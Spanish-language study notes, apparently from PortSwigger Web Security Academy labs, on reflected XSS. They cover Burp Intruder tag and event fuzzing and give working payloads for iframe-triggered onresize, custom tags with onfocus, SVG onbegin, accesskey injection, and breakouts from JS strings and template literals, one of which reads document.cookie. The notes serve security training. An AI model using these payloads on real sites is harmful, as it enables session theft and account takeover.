# XSS Reflejado 

Tags: #XSS-Reflected  #PortSwigger #JavaScript #Practitioner #svg #Etiquetas #iframes #Intruder #BurpSuite #JavaScript 

## XSS reflejado en HTML con etiquetas bloqueadas

* [Cheat sheet XSS](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)

```javascript 
// Para evadir se debe de utilizar ciertas etiquetas y ciertos eventos permitidos

1. Las etiquetas se encuentran haciendo un ataque de diccionario en el 'Intruder' en BurpSuite
	<test>

2. Despues se debe de conocer los eventos existentes para la etiqueta haciendo un ataque de diccionario 
	<body desconozco=1>

3. Al encontrar la etiqueta y su evento se puede hacer lo siguiente:
	<body onresize=print()>    // Forma manual 
	<iframe src="http://web.com/?search=<body onresize=print()>"></iframe>    // Se debe de utilizar 'iframes'
	<iframe src="http://web.com/?search=<body onresize=print()>" onload=this.style.width='100px'></iframe>         // Hacer que automáticamente haga un resize con el cambio de tamaño 
```

## XSS reflejado con solo etiquetas personalizadas 

```javascript 
// Para evadir se debe de utilizar ciertas etiquetas y ciertos eventos permitidos pero de forma personalizada 
	<etiqueta>Hi                     // Etiqueta personalizada 
	<etiqueta onfocus=alert(0)>Hi    // Cuando se pase el cursor y se seleccione se ejecute el alert
	<etiqueta onfocus=alert(0) tabindex=1>Hi

	//PoC 1
	<script>
		location = 'https://google.com';     
	</script>


	//PoC2 pero de esta manera no se hará automaticamente  
	<script>
		location = 'http://web.com/?search=<etiqueta onfocus=alert(0) tabindex=1>Hi';
	</script>


	//PoC3 de manera automaticamente colocando un id
	<script>
		location = 'http://web.com/?search=<etiqueta id=identificador onfocus=alert(document.cookie) tabindex=1>#identificador';
	</script>


Notas:
	1. El atributo global 'tabindex' indica si su elemento puede ser enfocado, y si participa en la navegación secuencial del teclado.
	2. Location te redirige a una web especifica
	3. Cuando en la url el navegador mira un '#' lo que hace es ir a ese elemento cuyo valor de identificador sea el que se indica 
```

## XSS reflejado con etiquetas SVG permitidas 

```javascript 
1. Las etiquetas se encuentran haciendo un ataque de diccionario en el 'Intruder' en BurpSuite
	<test>

2. Despues se debe de conocer los eventos existentes para la etiqueta haciendo un ataque de diccionario 
	<svg><animateTransform a=1>   // En el intruder de Burpsuite, el espacio se debe de representar conmo %20

3. Al encontrar la etiqueta y su evento se puede hacer lo siguiente:
	<svg><animateTransform onbegin=1>
	<svg><animateTransform onbegin=alert(0)>

Notas:
	1. 'Onbegin' es cuando la animaciónapenas esta cargando 
```

## XSS reflejado en etiqueta canonical 

```javascript 
// Para completar la tarea, se debe asumir que el usuario presionara las siguientes combinaciones de teclas dependiendo el SO: 'ALT+SHIFT+X, CTRL+ALT+X, ALT+X'

	http://web.com/?'   // Se puede colocar un ?' para cerrar la comilla que hay en el código y colocar algo despues 
	http://web.com/?'test
	
	http://web.com/?'accesskey='x'      // Ingresar eventos que ayuden a ejecutar instrucciones. Esto se hará por medio del 'accesskey' 

	http://web.com/?'accesskey='x'onclick='alert(0)    // Se utiliza el evento 'onclick' para cuando se ejecute el atajo, pasará lo que se indique. Se debe de cerrar la comilla en el códgo  


Notas:
	1. AccessKey establece la pulsación de teclado medienate el cual un usuario puede presionar para saltar a ese elemento 
	2. Si estamos en Linux y Chrome se presiona 'ALT+X' para que pase algo. 
```

## XSS reflejado en string JS con comilla y backslash escapados 

```javascript 
// Se debe buscar la forma de escapar ya que gracias a la sanitización se escapan las comillas que se ingresan automaticamente 

	test'; var prueba = 'se tensa   // Como hay sanitización el codigo agregará un \ para escapar las comillas que se ingresen  
	test\'; var prueba = \'se tensa  // Aunque se escapen manualmente las comillas, en el código se agregaran dos \ ya que existe sanitización

	</script><h1>hi</h1>            // Cerrar la etiqueta script y agregar una nueva etiqueta  
	
	</script><script>alert(0)</script>
```

##  XSS reflejado  en JS con comillas, corchetes y comilla escapada 

```javascript 
// Se debe buscar la forma de escapar ya que gracias a la sanitización se escapan las comillas que se ingresan automaticamente 

	test'         // Ingresar un comilla 
	test\'        // Escapar manualmente la comilla 
	test\'; var = 'se tensa       

	test\'+alert(0);//     // A la variable del código se le suma una ventana emerente y se le comenta 
```

## XSS en template literal con caracteres unicode escapados 

```javascript 
// Para este ejercicio esta sanitizado lo siguiente: '"`\<> . Cuando se esta utilizando `` lo que va adentro es ${var}, en donde se pueden hacer operatorias en Javascript 

	${alert(0)}
```